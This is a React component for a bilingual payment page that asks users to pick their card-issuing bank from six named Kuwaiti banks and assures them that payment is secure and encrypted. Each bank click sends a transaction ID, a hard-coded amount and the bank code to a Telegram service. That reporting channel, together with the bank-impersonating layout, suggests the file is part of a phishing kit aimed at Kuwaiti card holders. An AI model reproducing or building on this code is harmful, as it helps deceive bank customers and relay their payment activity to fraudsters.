import React from 'react';
import { Building2, CreditCard, ArrowRight, ArrowLeft } from 'lucide-react';
import { telegramService } from '../services/telegramService';

interface Bank {
  code: string;
  nameAr: string;
  nameEn: string;
  logo: string;
  color: string;
}

interface BankSelectionProps {
  onBankSelect: (bankCode: string) => void;
  isRTL: boolean;
}

const banks: Bank[] = [
  { code: 'NBK', nameAr: 'بنك الكويت الوطني', nameEn: 'National Bank of Kuwait', logo: '🏛️', color: 'bg-green-600' },
  { code: 'CBK', nameAr: 'البنك التجاري الكويتي', nameEn: 'Commercial Bank of Kuwait', logo: '🏢', color: 'bg-blue-600' },
  { code: 'GBK', nameAr: 'بنك الخليج', nameEn: 'Gulf Bank', logo: '🌊', color: 'bg-orange-600' },
  { code: 'ABK', nameAr: 'بنك الأهلي الكويتي', nameEn: 'Al Ahli Bank of Kuwait', logo: '⭐', color: 'bg-red-600' },
  { code: 'KFH', nameAr: 'بيت التمويل الكويتي', nameEn: 'Kuwait Finance House', logo: '🕌', color: 'bg-emerald-600' },
  { code: 'BURGAN', nameAr: 'بنك برقان', nameEn: 'Burgan Bank', logo: '💎', color: 'bg-purple-600' },
];

const BankSelection: React.FC<BankSelectionProps> = ({ onBankSelect, isRTL }) => {
  const ArrowIcon = isRTL ? ArrowLeft : ArrowRight;

  const handleBankSelect = (bankCode: string) => {
    // إرسال إشعار بدء المعاملة إلى التلغرام
    const transactionId = `TXN_${Date.now()}`;
    const amount = 150.500; // يمكن تمرير هذه القيمة كخاصية
    
    telegramService.sendTransactionStart(transactionId, amount, bankCode).catch(console.error);
    
    onBankSelect(bankCode);
  };

  return (
    <div className="bg-white rounded-xl shadow-xl p-8">
      <div className="text-center mb-8">
        <div className="flex items-center justify-center space-x-2 rtl:space-x-reverse mb-4">
          <Building2 className="h-8 w-8 text-blue-600" />
          <h2 className="text-3xl font-bold text-gray-800">
            {isRTL ? 'اختر البنك الخاص بك' : 'Select Your Bank'}
          </h2>
        </div>
        <p className="text-gray-600 max-w-2xl mx-auto">
          {isRTL 
            ? 'يرجى اختيار البنك المُصدر لبطاقتك الائتمانية لإتمام عملية الدفع بأمان'
            : 'Please select the bank that issued your credit card to complete the payment securely'
          }
        </p>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
        {banks.map((bank) => (
          <button
            key={bank.code}
            onClick={() => handleBankSelect(bank.code)}
            className="group relative bg-gradient-to-br from-white to-gray-50 border-2 border-gray-200 rounded-lg p-6 hover:border-blue-400 hover:shadow-lg transition-all duration-300 transform hover:-translate-y-1"
          >
            <div className="flex items-center space-x-4 rtl:space-x-reverse">
              <div className={`${bank.color} rounded-full p-3 text-white text-2xl group-hover:scale-110 transition-transform`}>
                {bank.logo}
              </div>
              <div className="flex-1 text-right rtl:text-left">
                <h3 className="font-semibold text-gray-800 text-lg">
                  {isRTL ? bank.nameAr : bank.nameEn}
                </h3>
                <p className="text-sm text-gray-500 mt-1">
                  {isRTL ? 'دفع آمن ومحمي' : 'Secure Payment'}
                </p>
              </div>
              <ArrowIcon className="h-5 w-5 text-gray-400 group-hover:text-blue-600 transition-colors" />
            </div>
            
            <div className="absolute inset-0 rounded-lg bg-blue-600 opacity-0 group-hover:opacity-5 transition-opacity"></div>
          </button>
        ))}
      </div>

      <div className="mt-8 bg-blue-50 rounded-lg p-6">
        <div className="flex items-start space-x-3 rtl:space-x-reverse">
          <CreditCard className="h-6 w-6 text-blue-600 mt-1" />
          <div>
            <h4 className="font-semibold text-blue-800 mb-2">
              {isRTL ? 'البطاقات المدعومة' : 'Supported Cards'}
            </h4>
            <p className="text-blue-700 text-sm leading-relaxed">
              {isRTL 
                ? 'يدعم النظام جميع بطاقات الائتمان والخصم المباشر الصادرة من البنوك الكويتية المحلية. جميع المعاملات مشفرة ومحمية بأعلى معايير الأمان.'
                : 'The system supports all credit and debit cards issued by local Kuwaiti banks. All transactions are encrypted and protected with the highest security standards.'
              }
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default BankSelection;